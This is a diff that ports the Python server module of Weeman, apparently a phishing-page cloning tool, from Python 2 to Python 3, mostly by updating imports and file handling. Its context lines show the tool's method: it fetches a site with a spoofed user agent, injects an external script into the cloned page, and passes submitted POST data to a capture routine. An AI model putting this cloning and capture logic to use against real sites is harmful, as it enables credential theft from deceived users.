@@ -6,9 +6,9 @@
 # See 'LICENSE' file for copying
 #
 
-import SimpleHTTPServer
-import SocketServer
-import urllib2
+import http.server
+import socketserver
+import urllib.request
 import cgi
 import os
 import time
@@ -16,9 +16,9 @@ from socket import error as socerr
 from core.config import __version__
 from core.config import __codename__
 from core.misc import printt
-from lib.bs4 import BeautifulSoup as bs
+from bs4 import BeautifulSoup as bs
 
-class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class handler(http.server.SimpleHTTPRequestHandler):
     ## Set server version
     server_version = "Weeman %s (%s)" %(__version__, __codename__)
     """
@@ -49,7 +49,7 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             from core.shell import action_url
             
             create_post(url,action_url, post_request)
-            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+            http.server.SimpleHTTPRequestHandler.do_GET(self)
         
         except socerr as e:
             printt(3, "%s igonring ..." %str(e))
@@ -87,11 +87,11 @@ class weeman(object):
 
         from core.shell import user_agent
         
-        opener = urllib2.build_opener()
+        opener = urllib.request.build_opener()
         opener.addheaders = [('User-Agent', user_agent),
                 ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),
                 #("Accept-Language","en-US,en;q=0.9,en;q=0.8"),
-                #("Accept-Encoding", "gzip;q=0,deflate,sdch"),
+                ("Accept-Encoding", "gzip;q=0,deflate,sdch"),
                 #("Accept-Charset", "ISO-8859-2,utf-8;q=0.7,*;q=0.7"),
                 ("Keep-Alive", "115"),
                 ("Connection", "keep-alive"),
@@ -126,14 +126,14 @@ class weeman(object):
         script = data.new_tag('script', src=external_js)
         data.html.head.insert(len(data.html.head), script)
         
-        with open("index.html", "w") as index:
+        with open("index.html", "wb") as index:
             index.write(data.prettify().encode('utf-8'))
             index.close()
 
     def serve(self):
         
         print("\033[01;35m[i] Starting Weeman %s server on http://localhost:%d\033[00m" %(__version__, self.port))
-        self.httpd = SocketServer.TCPServer(("", self.port),handler)
+        self.httpd = socketserver.TCPServer(("", self.port),handler)
         self.httpd.serve_forever()
 
     def cleanup(self):
